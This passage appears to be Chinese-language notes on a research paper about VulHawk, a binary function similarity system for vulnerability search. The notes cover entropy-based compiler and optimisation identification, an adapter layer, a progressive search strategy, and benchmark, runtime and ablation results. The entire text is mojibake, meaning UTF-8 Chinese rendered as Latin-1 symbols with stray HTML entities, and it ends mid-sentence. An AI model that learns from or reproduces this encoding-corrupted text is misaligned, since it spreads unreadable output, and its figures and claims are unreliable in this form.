é¦–å…ˆï¼Œæˆ‘ä»¬å°†æ··åˆæ–‡ä»¶ç¯å¢ƒçš„åµŒå…¥ç©ºé—´æ‹†åˆ†ä¸ºå¤šä¸ªåµŒå…¥å­ç©ºé—´ã€‚ å…¶æ¬¡ï¼Œé€‰æ‹©å…¶ä¸­ä¸€ä¸ªæ–‡ä»¶ç¯å¢ƒ V ä½œä¸ºä¸­é—´æ–‡ä»¶ç¯å¢ƒï¼Œå°† N ä¸ªå…·æœ‰ C2 N ä¸ªåœºæ™¯çš„æ–‡ä»¶ç¯å¢ƒä¸­çš„å‡½æ•°ç›¸ä¼¼åº¦é—®é¢˜åˆ’åˆ†ä¸º Nâˆ’1 ä¸ªå­å‡½æ•°åµŒå…¥ä¼ é€’é—®é¢˜ã€‚ æœ€åï¼Œæˆ‘ä»¬ä½¿ç”¨ç»è¿‡è®­ç»ƒçš„é€‚é…å™¨å°†ä¸åŒæ–‡ä»¶ç¯å¢ƒçš„å‡½æ•°åµŒå…¥ä¼ é€’åˆ°åŒä¸€ä¸ªæ–‡ä»¶ç¯å¢ƒ V ä¸­è¿›è¡Œç›¸ä¼¼åº¦è®¡ç®—ï¼Œå¯ä»¥ç¼“è§£ä¸åŒæ–‡ä»¶ç¯å¢ƒé€ æˆçš„å·®å¼‚ã€‚\nEntropy-based Binary Analysis ç”¨äºè¯†åˆ«æ–‡ä»¶ç¯å¢ƒ å› ä¸ºäºŒè¿›åˆ¶æ–‡ä»¶ä¸­æ²¡æœ‰ç›´æ¥æŒ‡ç¤ºç¼–è¯‘å™¨å’Œä¼˜åŒ–çº§åˆ«çš„ä¿¡æ¯ï¼Œæ‰€ä»¥ä»ä¿¡æ¯ç†è®ºçš„è§’åº¦æ¥ç†è§£äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¹¶å¼•å…¥ç†µæ¥è¯†åˆ«äºŒè¿›åˆ¶æ–‡ä»¶çš„ç¼–è¯‘å™¨å’Œä¼˜åŒ–çº§åˆ« å›¾ 6 æ˜¾ç¤ºäº†æ¥è‡ª 3 ä¸ªæ–‡ä»¶ç¯å¢ƒçš„ 12 ä¸ªä¸åŒäºŒè¿›åˆ¶æ–‡ä»¶çš„ç†µæµã€‚å¯ä»¥è§‚å¯Ÿåˆ°ï¼Œæ¥è‡ªç›¸åŒæ–‡ä»¶ç¯å¢ƒçš„ç†µæµä¼¼ä¹æ˜¯ç›¸ä¼¼çš„ï¼Œè€Œæ¥è‡ªä¸åŒæ–‡ä»¶ç¯å¢ƒçš„ç†µæµå´ä¸åŒã€‚ä½¿ç”¨ç†µæµå’Œç†µç†è®ºï¼Œæˆ‘ä»¬å¯ä»¥è¯†åˆ«ä¸åŒçš„ç¼–è¯‘å™¨å’Œä¼˜åŒ–ã€‚ ä½¿ç”¨æ®‹å·®ç¥ç»ç½‘ç»œ (ResNet) ä½œä¸ºåˆ†ç±»å™¨ï¼Œå¹¶ä½¿ç”¨ä¸Šè¿°ç‰¹å¾ä½œä¸ºè¯†åˆ«æ–‡ä»¶ç¯å¢ƒçš„è¾“å…¥ã€‚åŸºæœ¬æ®‹å—ç»“æ„å¦‚å›¾ 7 æ‰€ç¤ºã€‚å®ƒç”±æ‰¹é‡å½’ä¸€åŒ–å’Œçº¿æ€§å˜æ¢ç»„æˆï¼Œæ¿€æ´»å‡½æ•°ä¸º ReLUã€‚ä½¿ç”¨æ¥è‡ªè¾“å…¥çš„æ ‡è¯†æ˜ å°„çš„è·³è¿‡è¿æ¥è¢«æ·»åŠ åˆ°åŸºæœ¬å‰©ä½™å—è¾“å‡ºä¸­ï¼Œè¿™ä¿ç•™äº†å‡½æ•°è¯­ä¹‰ï¼Œå¹¶æœ‰åŠ©äºè§£å†³æ¢¯åº¦æ¶ˆå¤±é—®é¢˜ã€‚æˆ‘ä»¬ä½¿ç”¨å·ç§¯å±‚å¯¹è¾“å…¥è¿›è¡Œé‡‡æ ·ï¼Œè¯¥å±‚å°† 258 ç»´è¾“å…¥è½¬æ¢ä¸º 64 ç»´ç‰¹å¾ã€‚åœ¨ 16 å±‚å‰©ä½™åŸºæœ¬å—ä¹‹åï¼Œæˆ‘ä»¬ä½¿ç”¨çº¿æ€§é¢„æµ‹å’Œ softmax å‡½æ•°è¿›è¡Œå¤šç±»åˆ†ç±»ã€‚ç”±äº Os å’Œ Ofast åˆ†åˆ«æ˜¯å¯¹ O2 å’Œ O3 çš„å¢é‡ä¼˜åŒ–ï¼Œå› æ­¤æˆ‘ä»¬å°† Os å’Œ Ofast åˆ†åˆ«åŒ…å«åœ¨ O2 å’Œ O3 ä¸­ã€‚è¿™é‡Œï¼Œsoftmax çš„ç›®æ ‡æ˜¯ 8 ä¸ªç±» (2 ä¸ªç¼–è¯‘å™¨Ã— 4 ä¸ªä¼˜åŒ–)ã€‚ç†µåˆ†æå¸®åŠ©æˆ‘ä»¬è¯†åˆ«æ–‡ä»¶ç¯å¢ƒ (ç¼–è¯‘å™¨å’Œä¼˜åŒ–çº§åˆ«)ï¼Œä¸ºåç»­çš„å‡½æ•°åµŒå…¥ä¼ è¾“åšå‡†å¤‡ã€‚\nEntropy-based Adapter layer ä¸ºäº†è®¡ç®—æ¥è‡ªä¸åŒæ–‡ä»¶ç¯å¢ƒçš„äºŒè¿›åˆ¶å‡½æ•°çš„ç›¸ä¼¼æ€§ï¼Œæˆ‘ä»¬åœ¨ IRFM ä¹‹åæå‡ºäº†ä¸€ä¸ªåŸºäºç†µçš„é€‚é…å™¨å±‚ã€‚åŸºäºç†µçš„é€‚é…å™¨å±‚ä½œä¸ºæ˜ å°„ Fï¼Œå°†ä¸åŒæ–‡ä»¶ç¯å¢ƒä¸­çš„å‡½æ•°åµŒå…¥ä¼ é€’åˆ°ç›¸åŒçš„ä¸­é—´æ–‡ä»¶ç¯å¢ƒ V ä¸­ï¼Œä»¥ç¼“è§£ä¸åŒæ–‡ä»¶ç¯å¢ƒé€ æˆçš„å·®å¼‚ã€‚æ˜ å°„ F æ—¢åº”ä¿ç•™å‡½æ•°è¯­ä¹‰ï¼Œåˆåº”å‡è½»å› ä¸åŒæ–‡ä»¶ç¯å¢ƒè€Œäº§ç”Ÿçš„åå·®ã€‚\næ¸è¿›æœç´¢ç­–ç•¥ ç°çŠ¶ ä½¿ç”¨å‡½æ•°åµŒå…¥æ¥æœç´¢ç›¸ä¼¼å‡½æ•°ï¼Œè¿™ç§å±äºç²—ç²’åº¦æ£€æµ‹æ–¹æ³•ï¼Œå¯¼è‡´è¾ƒé«˜çš„å‡é˜³æ€§ ä½¿ç”¨åŒ¹é…ç½‘ç»œç­‰æ–¹æ³•åœ¨ç»†ç²’åº¦ä¸Šè®¡ç®—æ¯ä¸ªå‡½æ•°å¯¹çš„ç›¸ä¼¼æ€§ï¼Œç»“æœå¥½ï¼Œä½†æ˜¯è®¡ç®—æˆæœ¬é«˜ æ–¹æ³•ï¼š æå‡ºäº†ä¸€ç§æ–°çš„æœç´¢ç­–ç•¥ï¼Œç§°ä¸ºæ¸è¿›å¼æœç´¢ç­–ç•¥ï¼Œè¯¥ç­–ç•¥åŒ…å«ä¸¤ä¸ªå­ç­–ç•¥ã€‚é¦–å…ˆï¼Œä½¿ç”¨å‡½æ•°åµŒå…¥ä½œä¸ºç²—ç²’åº¦æœç´¢çš„å…¨å±€æ‘˜è¦ã€‚å…¶æ¬¡ï¼Œè®¾è®¡äº†å€™é€‰å‡½æ•°çš„æˆå¯¹ç›¸ä¼¼åº¦æ ¡å‡†ï¼Œç”¨ç»†ç²’åº¦ä¿¡æ¯è¡¥å……å‡½æ•°åµŒå…¥ï¼Œä»¥ä¿æŒæ¼æ´æ£€æµ‹çš„é«˜ç²¾åº¦\nå‡½æ•°åµŒå…¥æœç´¢ï¼šä¸ºäº†åœ¨å¤§å‹å‡½æ•°åº“ä¸­é«˜æ•ˆåœ°æ£€æµ‹ç›¸ä¼¼å‡½æ•°ï¼Œé‡‡ç”¨å‡½æ•°åµŒå…¥çš„æ¬§å¼è·ç¦»ç›¸ä¼¼åº¦å¯¹å€™é€‰å‡½æ•°è¿›è¡Œç²—ç²’åº¦æ£€ç´¢ï¼Œå¤§å¤§å‡å°äº†ç»†ç²’åº¦æ£€æµ‹çš„èŒƒå›´ï¼Œå‡è½»äº†è®¡ç®—è´Ÿæ‹…ã€‚ï¼ˆç®—æ³• 2 è¡Œï¼‰ ç›¸ä¼¼åº¦æ ¡å‡†ï¼šå®ƒç»“åˆåŸºæœ¬å—ã€å­—ç¬¦ä¸²å¸¸é‡å’Œå¯¼å…¥å‡½æ•°çš„ä¿¡æ¯ï¼Œè®¡ç®—æˆå¯¹ç›¸ä¼¼åº¦å¾—åˆ†ï¼Œä»ä¸­æå–å‘é‡ï¼Œå¹¶ä¸å‡½æ•°çº§ä¿¡æ¯ç›¸ç»“åˆï¼Œæé«˜æ¼æ´æ£€æµ‹æ€§èƒ½ã€‚ åŸºæœ¬å—çº§ç‰¹å¾ï¼šå¦‚å—åµŒå…¥åˆ†å¸ƒå’Œå‡½æ•°å¤§å°ï¼Œå¯èƒ½ä¼šåœ¨å‡½æ•°çº§åµŒå…¥ä¸­ä¸¢å¤±ã€‚ï¼ˆç®—æ³•ç¬¬ 6 è¡Œï¼‰è®¡ç®—æŸ¥è¯¢å‡½æ•°ä¸å…¶å€™é€‰å‡½æ•°ä¹‹é—´çš„åŸºæœ¬å—ç›¸ä¼¼åº¦ï¼Œä»¥è¡¥å……å—çº§ä¿¡æ¯ å­—ç¬¦ä¸²å¸¸é‡ç‰¹å¾ï¼šç”±äºå­—ç¬¦ä¸²å¸¸é‡å’Œå¯¼å…¥çš„å‡½æ•°åœ¨ç›¸ä¼¼çš„å‡½æ•°å¯¹ä¸­æ˜¯ç›¸åŒæˆ–ç›¸ä¼¼çš„ï¼Œå®ƒä»¬çš„ç›¸ä¼¼åº¦ä¹Ÿèµ·åˆ°æŒ‡ç¤ºå‡½æ•°ç›¸ä¼¼åº¦çš„ä½œç”¨ã€‚ï¼ˆç®—æ³•ç¬¬ 7 è¡Œï¼‰ å¯¼å…¥å‡½æ•°ï¼šï¼ˆç®—æ³•ç¬¬ 8 è¡Œï¼‰ä½¿ç”¨ jaccard æŒ‡æ•°è®¡ç®—ä¸¤ä¸ªå¯¼å…¥å‡½æ•°é›†çš„ç›¸ä¼¼åº¦ åœ¨è®¡ç®—å®Œä¸Šè¿°ä¸‰ä¸ªå‘é‡åï¼Œæˆ‘ä»¬å°†è¿™äº›å‘é‡å’Œå‡½æ•°åµŒå…¥æœç´¢ä¸­çš„ç›¸ä¼¼åº¦ s è¿æ¥åˆ°å‘é‡ V ä¸­ã€‚ç„¶åï¼Œæˆ‘ä»¬å°†å‘é‡ V è¾“å…¥å‰é¦ˆç½‘ç»œå­¦ä¹ æƒé‡å¹¶é¢„æµ‹æœ€ç»ˆå‡½æ•°ç›¸ä¼¼åº¦ s \u0026lsquo;ã€‚æˆ‘ä»¬ä½¿ç”¨äº¤å‰ç†µæŸå¤±å‡½æ•°æ¥ä¼˜åŒ–ç½‘ç»œæƒå€¼ã€‚æœ€åï¼Œæˆ‘ä»¬ä½¿ç”¨é»˜è®¤é˜ˆå€¼ h æ¥è¿‡æ»¤å‡ºä¸ç»“æœç›¸ä¼¼çš„å‡½æ•°ã€‚ è¯„ä¼° ä¸€å¯¹ä¸€æ¯”è¾ƒ æˆ‘ä»¬ç”¨ä¸€å¯¹ä¸€çš„å‡½æ•°ç›¸ä¼¼åº¦æ£€æµ‹å¯¹ VulHawk å’ŒåŸºçº¿çš„æ€§èƒ½è¿›è¡ŒåŸºå‡†æµ‹è¯•ï¼Œè¿™åœ¨ä¹‹å‰çš„æ–¹æ³•[27]ï¼Œ[34]ï¼Œ[41]ï¼Œ[55]ä¸­å¹¿æ³›æ‰§è¡Œã€‚ä¸ä»–ä»¬çš„å®éªŒè®¾ç½®ä¸€æ ·ï¼Œæˆ‘ä»¬ä¸ºæ¯ä¸ªä»»åŠ¡æ„å»ºäº†ä¸€ä¸ªç”± 50k ä¸ªæ­£å‡½æ•°å¯¹å’Œ 50k ä¸ªè´Ÿå‡½æ•°å¯¹ç»„æˆçš„å¹³è¡¡è¯„ä¼°é›†ï¼Œä»¥åŠä¸€ä¸ªç”± 1400 ä¸ªæ­£å‡½æ•°å¯¹å’Œ 140k ä¸ªè´Ÿå‡½æ•°å¯¹ç»„æˆçš„éå¹³è¡¡è¯„ä¼°é›†ã€‚æˆ‘ä»¬ä½¿ç”¨ (AUC) ä½œä¸ºæµ‹é‡å€¼ã€‚AUC æ˜¯ä¸€ä¸ªç»¼åˆäº†æ‰€æœ‰å¯èƒ½åˆ†ç±»é˜ˆå€¼çš„æ¨¡å‹çš„ç»¼åˆæ€§èƒ½åº¦é‡ã€‚è¡¨ä¸‰æ˜¾ç¤ºäº† VulHawk ä¸å…¶ä»–åŸºçº¿çš„æ¯”è¾ƒç»“æœã€‚ å¦‚å›¾æ‰€ç¤ºï¼Œåœ¨æ‰€æœ‰å®éªŒè®¾ç½®ä¸­ï¼ŒVulHawk åœ¨å¹³è¡¡é›†å’Œéå¹³è¡¡é›†ä¸Šçš„ AUC å¾—åˆ†å‡ä¼˜äº SAFEã€Asteriaã€GMNã€PalmTreeã€Asm2Vec å’Œ Trexã€‚\nä¸€å¯¹å¤šæœç´¢ åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†è¯„ä¼°ä¸€å¯¹å¤šæœç´¢çš„æ€§èƒ½ã€‚åœ¨ç ”ç©¶[34]ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨æ’åæµ‹é‡æ¥è¯„ä¼°æ¨¡å‹åœ¨æœç´¢åº”ç”¨ç¨‹åºä¸­çš„æ€§èƒ½ï¼Œä¾‹å¦‚ï¼Œæ¼æ´æœç´¢ï¼Œå®ƒä»ä¸€ä¸ªå¤§å‹æ•°æ®åº“ä¸­æ£€ç´¢å€™é€‰å‡½æ•°ã€‚æˆ‘ä»¬ä½¿ç”¨ä¸åŒ K é˜ˆå€¼çš„å¬å›ç‡ ( Recall@K ) ä½œä¸ºæŒ‡æ ‡ï¼Œè¿™æ˜¯ä¸€ä¸ªå¹¿æ³›ä½¿ç”¨çš„æ’åæŒ‡æ ‡ã€‚æˆ‘ä»¬ä½¿ç”¨ä¸å¹³è¡¡é›† (åœ¨ç¬¬ IV-B èŠ‚ä¸­) ä½œä¸ºè¯„ä»·é›†ã€‚åœ¨è¯„ä¼°ä¸­ï¼Œæ¨¡å‹è®¡ç®—æ¯ä¸ªæŸ¥è¯¢å‡½æ•°ä¸å…¶æ­£/è´Ÿæ ·æœ¬ä¹‹é—´çš„ç›¸ä¼¼æ€§å¹¶è¿›è¡Œæ’åºã€‚ æˆ‘ä»¬æ”¶é›†äº†ä¸åŒ top-K ç»“æœä¸‹çš„å¬å›ç‡ï¼Œå¹¶åœ¨å›¾ 9 ä¸­ç»˜åˆ¶äº†å¬å›ç‡ä¸ k çš„å…³ç³»ã€‚ç»“æœè¡¨æ˜ï¼ŒVulHawk ä¼˜äºæœ€å…ˆè¿›çš„æ–¹æ³•ï¼Œåœ¨ XO ä»»åŠ¡ä¸­è·å¾—äº†æœ€å¥½çš„ recall@1 ï¼Œä¸º 0.935ï¼Œåœ¨ XC+XO+XA ä»»åŠ¡ä¸­è·å¾—äº† 0.879ã€‚åœ¨ XC+XO+XA ä»»åŠ¡ä¸­ï¼Œå½“æ£€ç´¢åˆ°çš„ç»“æœæ•°é‡è¶…è¿‡ 30 ä¸ªæ—¶ï¼Œæ¯ç§æ–¹æ³•çš„å¬å›ç‡è¶‹äºç¨³å®šï¼Œå…¶ä¸­ VulHawk åœ¨ 0.994 å·¦å³è¾¾åˆ° recall@30 , VulHawk- es åœ¨ 0.968 å·¦å³è¾¾åˆ° recall@30 , VulHawk- s åœ¨ 0.988 å·¦å³è¾¾åˆ° recall@30 , Trex åœ¨ 0.888 å·¦å³è¾¾åˆ° recall@30 , SAFE åœ¨ 0.310 å·¦å³è¾¾åˆ° recall@30 ã€‚XC+XO+XA ä»»åŠ¡ä¸­ SAFE çš„ recall@K æ¥è¿‘äºéšæœºæ¦‚ç‡ (K 100)ï¼Œå› ä¸º SAFE åœ¨è·¨æ¶æ„ä»»åŠ¡ä¸­ç”±äºä¸¥é‡çš„ OOV é—®é¢˜è€Œä¸å¥å£®ï¼Œè¿™åœ¨ä¸€å¯¹ä¸€çš„æ¯”è¾ƒä¸­å·²ç»å¾—åˆ°äº†è¯æ˜ã€‚åœ¨å¯¹å¤§å‹å‡½æ•°åº“è¿›è¡Œä¸€å¯¹å¤šæœç´¢æ—¶ï¼ŒSAFE çš„å¼±ç‚¹è¢«æ”¾å¤§ï¼Œåªèƒ½å¾—åˆ° 0.007 çš„ recall@1 ã€‚å›ç­” r é—®é¢˜ 2: VulHawk å¯ä»¥åœ¨å¤§å‹å‡½æ•°åº“ä¸­å‡†ç¡®åœ°æ£€ç´¢æœ€ä½³å€™é€‰å‡½æ•°ã€‚\nå¤šå¯¹å¤šåŒ¹é… å¤šå¯¹å¤šåŒ¹é…ç”¨äºåœ¨å‡½æ•°çº§æµ‹é‡ä¸¤ä¸ªç»™å®šäºŒè¿›åˆ¶æ–‡ä»¶çš„ç›¸ä¼¼æ€§ã€‚ä½œä¸ºä»–ä»¬çš„å®éªŒè®¾ç½®ï¼Œæˆ‘ä»¬ä¸ºæ¯ä¸ªä»»åŠ¡æ„é€ ä¸€ä¸ªäºŒè¿›åˆ¶å¯¹çš„è¯„ä¼°é›†ï¼Œå¹¶ä¸ºæ¯ä¸ªäºŒè¿›åˆ¶å¯¹ç”Ÿæˆæœ€ä½³å‡½æ•°ç›¸ä¼¼åº¦åŒ¹é…å·¥å…·ã€‚æˆ‘ä»¬åœ¨è¡¨ IV ä¸­æŠ¥å‘Šäº†æ¯ç§å·¥å…·åœ¨ä¸åŒä»»åŠ¡ä¸‹çš„å¹³å‡å¬å›ç‡å’Œç²¾åº¦ç»“æœã€‚ å…¶ä¸­ï¼ŒåŸºçº¿åœ¨ XO å®éªŒçš„ O0O3 ä¸­ç»“æœæœ€ä½ã€‚åœ¨æœ¬å®éªŒä¸­ï¼ŒVulHawk çš„å¬å›ç‡ä¸º 0.876ï¼Œæ¯” SAFEã€Asteriaã€Asm2Vecã€BinDiffã€PalmTreeã€GMN å’Œ Trex çš„å¬å›ç‡åˆ†åˆ«æé«˜äº† 385.9%ã€292.9%ã€208.6%ã€240.0%ã€211.6%ã€621.3%å’Œ 202.8%ã€‚æœ‰è¶£çš„æ˜¯ï¼ŒVulHawk æœ€å·®çš„ç»“æœ (0.805) æ˜¯åœ¨ XC å®éªŒä¸­ï¼Œè€Œä¸æ˜¯åœ¨ O0-O3 å®éªŒä¸­ã€‚å°½ç®¡å¦‚æ­¤ï¼Œåœ¨ XC å®éªŒä¸­ï¼ŒVulHawk ä»ç„¶ä¼˜äºæœ€å…ˆè¿›çš„æ–¹æ³•ã€‚O3 é€‰é¡¹ä¸­ï¼Œä¸ºäº†å‡å°äºŒè¿›åˆ¶å‡½æ•°çš„å¤§å°ï¼Œæé«˜æ•ˆç‡ï¼Œå°† O0 é€‰é¡¹ä¸­çš„å†—ä½™æŒ‡ä»¤å‹ç¼©ä¸ºç®€æ´çš„æŒ‡ä»¤ï¼Œå¼ºåŒ–äº†ä¸»è¦è¯­ä¹‰ï¼Œå»æ‰äº†å‡½æ•°çš„å†—ä½™è¯­ä¹‰ï¼Œå¯¼è‡´è¯­ä¹‰å·®å¼‚ã€‚VulHawk ä½¿ç”¨ç®€åŒ–æŒ‡ä»¤æå–äºŒè¿›åˆ¶å‡½æ•°ï¼Œå¹¶ä¿ç•™äº†ä¸»è¦è¯­ä¹‰ï¼Œè¿™æœ‰åŠ©äºå‡è½»ä¼˜åŒ–çº§åˆ«çš„å½±å“ï¼Œä½¿å…¶èƒ½å¤Ÿé€‚åº”äº¤å‰ä¼˜åŒ–çº§åˆ«çš„å®éªŒã€‚ å›¾ 10 ç”¨å°æç´å›¾å±•ç¤ºäº† XCã€XA å’Œ XO ä»»åŠ¡çš„æŸ¥å…¨ç‡å’ŒæŸ¥å‡†ç‡åˆ†å¸ƒï¼Œæˆ‘ä»¬åœ¨å›¾ä¸Šæ–¹æ ‡æ³¨äº†æ¯ç§æ–¹æ³•çš„å¹³å‡ç»“æœã€‚ä¸ SAFEã€BinDiffã€Asteriaã€Asm2vecã€PalmTreeã€GMNã€Trex ç›¸æ¯”ï¼ŒVulHawk çš„å¬å›ç‡å’Œç²¾åº¦æ¦‚ç‡åˆ†å¸ƒæ›´æ¥è¿‘äº 1 ä¸”æ›´é›†ä¸­ï¼Œè€Œå…¶ä»–æ–¹æ³•åœ¨ä¸åŒåœºæ™¯ä¸‹çš„ç»“æœåˆ†å¸ƒåˆ†æ•£ä¸”ä¸ç¨³å®šã€‚è¿™è¡¨æ˜ï¼ŒVulHawk çš„æ€§èƒ½æ¯”å…¶ä»–åŸºçº¿æ›´å¥½ï¼Œæ›´ç¨³å®šã€‚ ä¸ä¸€å¯¹ä¸€æ¯”è¾ƒç›¸æ¯”ï¼Œå¤šå¯¹å¤šåŒ¹é…çš„æŸ¥å…¨ç‡å’Œå‡†ç¡®ç‡è¾ƒä½ï¼Œè¿™æ˜¯å› ä¸ºå¤šå¯¹å¤šåŒ¹é…çš„è´Ÿæ ·æœ¬è¾ƒå¤šï¼Œé”™è¯¯åŒ¹é…å¯¹ä¼šå½±å“åŒ¹é…ç®—æ³•çš„åç»­ç»“æœ (å¦‚åŒˆç‰™åˆ©ç®—æ³•[25])ã€‚å›ç­” RQ.3: VulHawk å¯ä»¥ç”¨äºåœ¨ä¸¤ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ä¹‹é—´åŒ¹é…ç›¸ä¼¼çš„å‡½æ•°ï¼Œå¹¶ä¸”å®ƒåœ¨å¤šå¯¹å¤šåŒ¹é…æ–¹é¢ä¼˜äºæœ€å…ˆè¿›çš„æ–¹æ³•ã€‚\nè¿è¡Œæ—¶æ•ˆç‡ æˆ‘ä»¬è¯„ä¼°äº† VulHawk åœ¨ä¸åŒè®¾ç½®ä¸‹çš„è¿è¡Œæ•ˆç‡ã€‚ç»™å®šä¸€ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬ä½¿ç”¨è¢«è¯„ä¼°æ¨¡å‹æå–ç‰¹å¾å¹¶ç”Ÿæˆå…¶å‡½æ•°åµŒå…¥ï¼Œç„¶åä»å­˜å‚¨åº“ä¸­æ£€ç´¢å‰ 10 ä¸ªå€™é€‰å‡½æ•°ã€‚è®°å½•æ—¶é—´æ˜¯ä»æå–ç‰¹å¾åˆ°è¿”å›å€™é€‰å‡½æ•°çš„ç›¸ä¼¼åº¦ï¼Œæ¯æ¬¡æµ‹è¯•æµ‹é‡åæ¬¡ï¼Œå°½é‡å‡å°‘æ„å¤–å› ç´ ã€‚å­˜å‚¨åº“å¤§å°è®¾ç½®ä¸º 103ã€104ã€105 å’Œ 106ã€‚ è¡¨ V æ˜¾ç¤ºäº†åœ¨ä¸åŒå¤§å°çš„å­˜å‚¨åº“ä¸­æœç´¢å‡½æ•°çš„æ—¶é—´æˆæœ¬åŠå…¶ååé‡ã€‚ååé‡è¡¨ç¤ºä¸€ç§’é’Ÿå†…å¯ä»¥æ£€ç´¢åˆ°çš„å­˜å‚¨åº“å‡½æ•°çš„æ•°é‡ï¼Œå®ƒæ²¡æœ‰è€ƒè™‘åµŒå…¥ç”Ÿæˆçš„å¼€é”€ã€‚ç»“æœè¡¨æ˜ï¼ŒVulHawk æ¯” VulHawk- es å’Œ VulHawk- s æ…¢ï¼Œè¿™æ˜¯å› ä¸º VulHawk åœ¨åµŒå…¥ç”Ÿæˆè¿‡ç¨‹ä¸­ä½¿ç”¨äº†åŸºäºç†µçš„é€‚é…å™¨ï¼Œåœ¨æœç´¢è¿‡ç¨‹ä¸­ä½¿ç”¨äº†ç›¸ä¼¼åº¦æ ¡å‡†ã€‚ç”¨è¾ƒå°çš„å¼€é”€æ¢å–æ›´é«˜çš„ç²¾åº¦å’Œå¬å›ç‡æ˜¯å¯ä»¥æ¥å—çš„ã€‚é€šè¿‡ GPU åŠ é€Ÿï¼ŒVulHawk å¯ä»¥åœ¨å¤§çº¦ 2 ç§’å†…ä» 106 ä¸ªå‡½æ•°ä¸­æœç´¢ä¸€ä¸ªå‡½æ•°ã€‚å›ç­” RQ.4: VulHawk å¯ä»¥åœ¨å¤§å‹å‡½æ•°åº“ä¸­ä¿æŒé«˜æ•ˆç‡ (106)ã€‚\nAblation Study åŸºäºç†µçš„é€‚é…å™¨ï¼šä»è¡¨ III å¯ä»¥çœ‹å‡ºï¼Œåœ¨ 7 ä¸ªä¸€å¯¹ä¸€çš„åŠŸèƒ½æ¯”è¾ƒä»»åŠ¡ä¸­ï¼ŒVulHawkS çš„ AUC é«˜äº VulHawk-ESã€‚åœ¨å›¾ 9 ä¸­ï¼ŒVulHawk-S åœ¨ä¸€å¯¹å¤šæœç´¢ä¸­è·å¾—äº†æ¯” VulHawk-ES æ›´é«˜çš„ recalls@K ã€‚è¿™äº›ç»“æœè¡¨æ˜ï¼ŒVulHawk-S çš„æ€§èƒ½ä¼˜äº VulHawkESï¼Œè¿™è¡¨æ˜æ€§èƒ½çš„æå‡æ¥è‡ªäºåŸºäºç†µçš„é€‚é…å™¨çš„è´¡çŒ®ï¼Œè€Œä¸æ˜¯é¢å¤–çš„ç¥ç»ç½‘ç»œã€‚åŸºäºç†µçš„é€‚é…å™¨å°†ä¸åŒæ–‡ä»¶ç¯å¢ƒä¸­çš„å‡½æ•°åµŒå…¥è½¬ç§»åˆ°ç›¸åŒçš„æ–‡ä»¶ç¯å¢ƒä¸­ï¼Œå‡è½»äº†ç¼–è¯‘å™¨å’Œä¼˜åŒ–çº§åˆ«å¸¦æ¥çš„å·®å¼‚ã€‚ä¾‹å¦‚ï¼Œåœ¨å¤šå¯¹å¤šåŒ¹é…åœºæ™¯ä¸‹ï¼ŒO0-O3 å®éªŒä¸­ï¼ŒVulHawk-ES çš„å¬å›ç‡ä¸º 0.793ï¼Œè€Œ VulHawk-S é€šè¿‡åŸºäºç†µçš„é€‚é…å™¨ç¼“è§£äº†ä¸åŒæ–‡ä»¶ç¯å¢ƒé€ æˆçš„å·®å¼‚ï¼Œå¬å›ç‡ä¸º 0.873ã€‚ ç›¸ä¼¼åº¦æ ¡å‡†ï¼šä»è¡¨ III å’Œå›¾ 9 å¯ä»¥çœ‹å‡ºï¼Œåœ¨ä¸€å¯¹ä¸€åŠŸèƒ½å¯¹æ¯”å’Œä¸€å¯¹å¤šæœç´¢åœºæ™¯ä¸‹ï¼ŒVulHawk çš„æœç´¢ç»“æœä¼˜äº VulHawk- sã€‚è¡¨å››è¿˜æ˜¾ç¤ºï¼Œåœ¨å¤šå¯¹å¤šåŒ¹é…åœºæ™¯ä¸­ï¼ŒVulHawk æ¯” VulHawkS æ›´ç²¾ç¡®ã€‚åœ¨ O0-O3 å¤šå¯¹å¤šåŒ¹é…ä»»åŠ¡ä¸­ï¼ŒVulHawk çš„ç²¾åº¦ä» 0.593 æé«˜åˆ° 0.818ï¼Œè¿™æ˜¯å› ä¸º VulHawk ä½¿ç”¨ç›¸ä¼¼åº¦æ ¡å‡†ä»å—çº§ç‰¹å¾ã€å­—ç¬¦ä¸²ç‰¹å¾å’Œå¯¼å…¥å‡½æ•°ä¸­è¡¥å……äº†å‡½æ•°ç›¸ä¼¼åº¦ï¼Œä½¿å¾—ç›¸ä¼¼åº¦è®¡ç®—ä¸­è€ƒè™‘çš„ä¿¡æ¯æ›´åŠ å…¨é¢ï¼Œæé«˜äº†æ£€æµ‹ç²¾åº¦ã€‚ æ–‡ä»¶ç¯å¢ƒè¯†åˆ« æˆ‘ä»¬è¿˜è¯„ä¼°äº†åŸºäºç†µçš„æ–‡ä»¶ç¯å¢ƒè¯†åˆ«çš„å‡†ç¡®æ€§ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬ä½¿ç”¨ 10 å€äº¤å‰éªŒè¯æ¥åˆ†å‰²æ‰€æœ‰äºŒè¿›åˆ¶æ–‡ä»¶è¿›è¡Œè®­ç»ƒå’Œè¯„ä¼°ï¼Œå°±åƒåœ¨ä¼ ç»Ÿçš„æœºå™¨å­¦ä¹ è®¾ç½®ä¸­ä¸€æ ·ã€‚è¿™äº›äºŒè¿›åˆ¶æ–‡ä»¶æ¥è‡ªä¸åŒçš„ä½“ç³»ç»“æ„ (x86ã€arm å’Œ mips) å’Œä¸åŒçš„ç¼–è¯‘å™¨ (GCC å’Œ Clang)ã€‚Pizzolotto ç­‰äººåœ¨å‡½æ•°å­—èŠ‚ä¸Šä½¿ç”¨ CNN æ¨¡å‹å’Œ LSTM æ¨¡å‹æ¥è¯†åˆ«æ–‡ä»¶ç¯å¢ƒã€‚ä¸ºäº†æ›´å¥½åœ°æ¼”ç¤ºæˆ‘ä»¬çš„æ–¹æ³•çš„æ€§èƒ½ï¼Œæˆ‘ä»¬ä¸‹è½½äº†ä»–ä»¬é¢„å…ˆè®­ç»ƒå¥½çš„æ¨¡å‹ï¼Œå¹¶å°†å®ƒä»¬ (CNN å’Œ LSTM) è®¾ç½®ä¸ºæ¯”è¾ƒã€‚è¯·æ³¨æ„ï¼Œç»™å®šäºŒè¿›åˆ¶æ–‡ä»¶çš„ç¼–è¯‘å™¨å’Œä¼˜åŒ–çº§åˆ«æ˜¯æœªçŸ¥çš„ï¼Œå¹¶ä¸”åœ¨å®è·µä¸­æ˜¯ä¸åŒçš„ï¼Œå› æ­¤åœ¨è¯„ä¼°ä¸€ä¸ªå‚æ•° 